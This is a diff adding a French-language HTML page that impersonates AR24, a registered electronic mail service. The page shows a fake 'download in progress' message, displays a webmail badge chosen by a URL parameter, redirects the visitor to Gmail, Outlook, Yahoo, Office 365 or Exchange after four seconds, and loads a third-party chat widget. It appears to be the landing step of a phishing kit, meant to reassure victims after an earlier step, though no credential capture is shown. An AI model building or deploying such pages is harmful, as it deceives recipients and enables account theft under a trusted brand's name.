@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="fr" class="no-js">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <title>Téléchargement du courrier - AR24</title>
+    <link rel="stylesheet" href="https://app.ar24.fr/static/min/?f=css/reset.css,css/design-system.css,fonts/font-barlow.css,fonts/font-montserrat.css&1771239617" />
+    <link href="https://app.ar24.fr/static/css/pages/user-login.css?v=1771239617" rel="stylesheet" type="text/css" />
+    <style>
+      .download-wrapper { min-height: calc(100vh - 260px); display: flex; justify-content: center; align-items: center; padding: 32px 16px; }
+      .download-card { width: min(100%, 580px); padding: 42px 32px; border-radius: 28px; background: #ffffff; box-shadow: 0 24px 60px rgba(17, 24, 39, 0.12); text-align: center; }
+      .download-logo { width: 104px; height: 104px; margin: 0 auto 18px; border-radius: 28px; display: grid; place-items: center; background: linear-gradient(145deg, #edf8ff, #d8f1fb); }
+      .download-logo svg { width: 62px; height: 62px; }
+      .spinner { width: 68px; height: 68px; margin: 22px auto; border: 5px solid #d8eef4; border-top-color: #11b8d8; border-radius: 50%; animation: spin 1s linear infinite; }
+      .download-title { margin: 0; font-family: 'Montserrat', sans-serif; font-size: clamp(1.8rem, 4vw, 2.4rem); }
+      .download-text { margin: 14px 0 0; color: #667085; font-size: 1.06rem; line-height: 1.6; }
+      .provider-note { margin-top: 16px; display: inline-flex; align-items: center; gap: 10px; padding: 10px 16px; border-radius: 999px; background: #f5f8ff; }
+      .provider-icon { width: 32px; height: 32px; border-radius: 10px; display: grid; place-items: center; overflow: hidden; }
+      .provider-icon svg { width: 22px; height: 22px; }
+      .icon-gmail { background: #fff2f0; } .icon-outlook { background: #eef4ff; } .icon-yahoo { background: #f5ecff; } .icon-office365 { background: #fff1e9; } .icon-other { background: #eafcff; } .icon-exchange { background: #edf5ff; }
+      @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+    </style>
+  </head>
+  <body class="guest"><header id="header"><div class="wrapper"><a href="#" class="header-logo">AR24 - Lettre Recommandée Électronique</a></div></header>
+    <main id="main-content"><div class="download-wrapper"><section class="download-card" aria-live="polite"><div class="download-logo" aria-hidden="true"><svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><defs><linearGradient id="envTop" x1="0" x2="1"><stop offset="0" stop-color="#1cc5df"/><stop offset="1" stop-color="#0d90c9"/></linearGradient></defs><path d="M8 18 24 8l16 10-16 9z" fill="url(#envTop)"/><path d="M8 19v17a4 4 0 0 0 4 4h24a4 4 0 0 0 4-4V19l-16 9z" fill="#fff" stroke="#cfe5ea"/></svg></div><h1 class="download-title">Téléchargement en cours</h1><div class="spinner" aria-hidden="true"></div><p class="download-text">Votre courrier est en cours de téléchargement et est envoyer à votre boîte mail.</p><div id="providerNote" class="provider-note"></div></section></div></main>
+    <footer id="footer"><div class="wrapper"><div class="top"><div class="logo"><img alt="" src="/static/images/logo/AR24.svg" /></div><div class="line"><div>Votre solution d'envoi de recommandés électroniques fiable, pratique et efficace.</div><div>AR24 est une filiale de Docaposte</div></div></div></div></footer>
+    <script>
+      const icons = { gmail: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="#EA4335" d="M24 24 8 12v24h8V22l8 6 8-6v14h8V12z"/><path fill="#4285F4" d="M40 12v24h-8V22z"/><path fill="#34A853" d="M8 12v24h8V22z"/><path fill="#FBBC04" d="M40 12H8l16 12z"/></svg>`, outlook: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="#0A64C5" d="M18 10h20a2 2 0 0 1 2 2v24a2 2 0 0 1-2 2H18z"/><path fill="#1976D2" d="M10 14h16v20H10z"/><path fill="#5EA9FF" d="M18 16l20 10-20 10z" opacity=".9"/><circle cx="18" cy="24" r="6" fill="#fff"/><circle cx="18" cy="24" r="3.5" fill="#0A64C5"/></svg>`, yahoo: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="#6001D2" d="M16 10h8l3 8 3-8h8l-8 18v10h-8V28z"/><circle cx="33" cy="34" r="4" fill="#6001D2"/></svg>`, office365: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="#D83B01" d="M12 14 26 8l10 6v20l-10 6-14-6z"/><path fill="#FF6A00" d="M12 14v20l14 6V8z" opacity=".95"/><path fill="#C43E00" d="M26 8v32l10-6V14z" opacity=".9"/></svg>`, other: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><rect x="8" y="12" width="32" height="24" rx="4" fill="#12B5CB"/><path d="m12 16 12 9 12-9" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>`, exchange: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill="#0F6CBD" d="M18 10h18a2 2 0 0 1 2 2v24a2 2 0 0 1-2 2H18z"/><path fill="#185ABD" d="M10 14h14v20H10z"/><path d="M15 19h4l-3 5 3 5h-4l-3-5z" fill="#fff"/></svg>` };
+      const config = { gmail: { label: 'Gmail', iconClass: 'icon-gmail', target: 'https://mail.google.com/' }, outlook: { label: 'Hotmail / Outlook / Live', iconClass: 'icon-outlook', target: 'https://outlook.live.com/' }, yahoo: { label: 'Yahoo', iconClass: 'icon-yahoo', target: 'https://mail.yahoo.com/' }, office365: { label: 'Office 365', iconClass: 'icon-office365', target: 'https://www.office.com/' }, other: { label: 'Autres messages', iconClass: 'icon-other', target: 'mailto:' }, exchange: { label: 'Mail Exchange', iconClass: 'icon-exchange', target: 'https://www.microsoft.com/microsoft-365/exchange/email' } };
+      const params = new URLSearchParams(window.location.search);
+      const key = params.get('provider');
+      const provider = config[key] || config.gmail;
+      const icon = icons[key] || icons.gmail;
+      document.getElementById('providerNote').innerHTML = `<span class="provider-icon ${provider.iconClass}">${icon}</span><span>Destination : ${provider.label}</span>`;
+      window.setTimeout(() => { window.location.href = provider.target; }, 4000);
+    </script>
+    <script src="//code.tidio.co/7infjs1hu3tvvi6swicmo9klmhijsizg.js" async></script>
+  </body>
+</html>
